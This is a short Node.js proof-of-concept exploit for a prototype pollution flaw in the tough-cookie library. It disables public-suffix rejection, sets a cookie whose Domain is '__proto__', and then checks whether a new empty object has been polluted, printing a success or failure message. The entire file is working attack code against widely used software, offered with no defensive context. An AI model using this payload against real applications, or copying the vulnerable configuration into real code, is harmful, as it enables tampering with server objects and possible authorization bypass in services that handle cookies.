const tough = require('tough-cookie');

async function main() {
  // Create a CookieJar without the `rejectPublicSuffixes` option, to trigger the vulnerability.
  const cookiejar = new tough.CookieJar(undefined, { rejectPublicSuffixes: false });

  try {
    // Attempt to set an exploit cookie with Domain set to '__proto__'
    // This is to trigger Prototype Pollution vulnerability in tough-cookie
    await cookiejar.setCookieSync(
      "Slonser=polluted; Domain=__proto__; Path=/notauth",
      "https://__proto__/admin"
    );

    // Accessing the polluted object.
    const a = {};
    if (a["/notauth"] && a["/notauth"]["Slonser"]) {
      console.log("EXPLOITED SUCCESSFULLY");
    } else {
      console.log("EXPLOIT FAILED");
    }
  } catch (err) {
    console.error("An error occurred:", err);
  }

  // Normal cookie to ensure CookieJar still works properly.
  await cookiejar.setCookieSync(
    "Auth=Lol; Domain=google.com; Path=/notauth",
    "https://google.com/"
  );
}

main();
